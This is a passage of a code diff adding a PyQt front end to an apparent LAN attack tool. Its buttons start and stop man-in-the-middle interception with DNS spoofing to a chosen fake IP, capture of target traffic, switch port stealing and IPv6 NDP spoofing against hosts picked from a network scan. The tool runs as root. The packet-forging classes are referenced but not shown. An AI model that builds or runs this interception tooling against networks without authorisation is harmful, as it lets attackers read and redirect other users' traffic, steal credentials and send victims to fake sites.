+        self.portsteal_tab.setLayout(layout)
+        self.portsteal_start_btn.clicked.connect(self.start_portsteal)
+        self.portsteal_stop_btn.clicked.connect(self.stop_portsteal)
+
+    def init_ndp_tab(self):
+        layout = QVBoxLayout()
+        self.ndp_iface_box = QComboBox()
+        for iface in scapy.get_if_list():
+            self.ndp_iface_box.addItem(iface)
+        layout.addWidget(QLabel("IPv6 Interface:"))
+        layout.addWidget(self.ndp_iface_box)
+        self.ndp_router_line = QLineEdit()
+        self.ndp_targets_line = QLineEdit()
+        layout.addWidget(QLabel("Router IPv6:"))
+        layout.addWidget(self.ndp_router_line)
+        layout.addWidget(QLabel("Targets IPv6 (comma separated):"))
+        layout.addWidget(self.ndp_targets_line)
+        self.ndp_start_btn = QPushButton("Start NDP MITM")
+        self.ndp_stop_btn = QPushButton("Stop NDP MITM")
+        self.ndp_log = QTextEdit()
+        self.ndp_log.setReadOnly(True)
+        layout.addWidget(self.ndp_start_btn)
+        layout.addWidget(self.ndp_stop_btn)
+        layout.addWidget(QLabel("NDP Activity Log:"))
+        layout.addWidget(self.ndp_log)
+        self.ndp_tab.setLayout(layout)
+        self.ndp_start_btn.clicked.connect(self.start_ndp_spoof)
+        self.ndp_stop_btn.clicked.connect(self.stop_ndp_spoof)
+
+    def log(self, msg):
+        self.log_text.append(msg)
+
+    def do_scan(self, ipv6=False):
+        iface = self.iface_box.currentText()
+        self.device_table.setRowCount(0)
+        self.devices = scan_network(iface, self.log, ipv6=ipv6)
+        for ip, mac, vendor in self.devices:
+            row = self.device_table.rowCount()
+            self.device_table.insertRow(row)
+            self.device_table.setItem(row, 0, QTableWidgetItem(str(ip)))
+            self.device_table.setItem(row, 1, QTableWidgetItem(str(mac)))
+            self.device_table.setItem(row, 2, QTableWidgetItem(str(vendor)))
+        self.log(f"Scan complete: {len(self.devices)} devices.")
+
+    def set_as_router(self):
+        rows = self.device_table.selectionModel().selectedRows()
+        if rows:
+            ip = self.device_table.item(rows[0].row(), 0).text()
+            self.selected_router = ip
+            self.router_lbl.setText(f"Router: {ip}")
+            self.log(f"Router set to {ip}")
+
+    def add_as_target(self):
+        rows = self.device_table.selectionModel().selectedRows()
+        if rows:
+            ip = self.device_table.item(rows[0].row(), 0).text()
+            if ip == self.selected_router:
+                QMessageBox.warning(self, "Invalid Target", "Cannot add the router as target.")
+                return
+            if ip not in self.selected_targets and len(self.selected_targets) < 5:
+                self.selected_targets.append(ip)
+                self.targets_lbl.setText(f"Targets: {', '.join(self.selected_targets)}")
+                self.log(f"Added target: {ip}")
+
+    def start_mitm(self):
+        if not self.selected_router or not self.selected_targets:
+            QMessageBox.warning(self, "Missing", "Select a router and at least one target.")
+            return
+        iface = self.iface_box.currentText()
+        domains = [d.strip() for d in self.dns_domain_line.text().split(",") if d.strip()]
+        fake_ip = self.dns_ip_line.text().strip()
+        self.mitm_thread = MITMThread(self.selected_targets, self.selected_router, iface, dns_spoof_domains=domains, dns_spoof_ip=fake_ip)
+        self.mitm_thread.log.connect(self.log)
+        self.mitm_thread.finished.connect(lambda: self.log("MITM thread finished."))
+        self.mitm_thread.start()
+        self.capture_thread = PacketCaptureThread(self.selected_targets, iface, dns_spoof_domains=domains, dns_spoof_ip=fake_ip)
+        self.capture_thread.log.connect(self.log)
+        self.capture_thread.finished.connect(lambda: self.log("Capture thread finished."))
+        self.capture_thread.start()
+        self.log("MITM + packet capture started.")
+
+    def stop_mitm(self):
+        if self.mitm_thread:
+            self.mitm_thread.stop()
+            self.mitm_thread.wait()
+            self.mitm_thread = None
+        if self.capture_thread:
+            self.capture_thread.stop()
+            self.capture_thread.wait()
+            self.capture_thread = None
+        self.log("MITM + packet capture stopped.")
+
+    def start_portsteal(self):
+        if not self.selected_targets:
+            QMessageBox.warning(self, "No Targets", "Add at least one target in the Scanner tab.")
+            return
+        iface = self.iface_box.currentText()
+        self.portsteal_thread = PortStealerThread(iface, self.selected_targets)
+        self.portsteal_thread.log.connect(self.portsteal_log.append)
+        self.portsteal_thread.finished.connect(lambda: self.portsteal_log.append("Port Stealing finished."))
+        self.portsteal_thread.start()
+        self.portsteal_log.append("Port stealing started.")
+
+    def stop_portsteal(self):
+        if self.portsteal_thread:
+            self.portsteal_thread.stop()
+            self.portsteal_thread.wait()
+            self.portsteal_thread = None
+        self.portsteal_log.append("Port stealing stopped.")
+
+    def start_ndp_spoof(self):
+        iface = self.ndp_iface_box.currentText()
+        router = self.ndp_router_line.text().strip()
+        targets = [t.strip() for t in self.ndp_targets_line.text().split(",") if t.strip()]
+        if not router or not targets:
+            QMessageBox.warning(self, "Missing", "Enter router IPv6 and at least one target IPv6.")
+            return
+        self.ndp_thread = NDPSpoofThread(targets, router, iface)
+        self.ndp_thread.log.connect(self.ndp_log.append)
+        self.ndp_thread.finished.connect(lambda: self.ndp_log.append("NDP MITM finished."))
+        self.ndp_thread.start()
+        self.ndp_log.append("NDP spoof started.")
+
+    def stop_ndp_spoof(self):
+        if self.ndp_thread:
+            self.ndp_thread.stop()
+            self.ndp_thread.wait()
+            self.ndp_thread = None
+        self.ndp_log.append("NDP spoof stopped.")
+
+    def closeEvent(self, event):
+        if self.mitm_thread:
+            self.mitm_thread.stop()
+            self.mitm_thread.wait()
+            self.mitm_thread = None
+        if self.capture_thread:
+            self.capture_thread.stop()
+            self.capture_thread.wait()
+            self.capture_thread = None
+        if self.portsteal_thread:
+            self.portsteal_thread.stop()
+            self.portsteal_thread.wait()
+            self.portsteal_thread = None
+        if self.ndp_thread:
+            self.ndp_thread.stop()
+            self.ndp_thread.wait()
+            self.ndp_thread = None
+        event.accept()
 
 if __name__ == "__main__":
-    main()
+    if os.geteuid() != 0:
+        print("[!] Please run as root")
+        sys.exit(1)
+    app = QApplication(sys.argv)
+    window = MainWindow()
+    window.show()
+    sys.exit(app.exec())
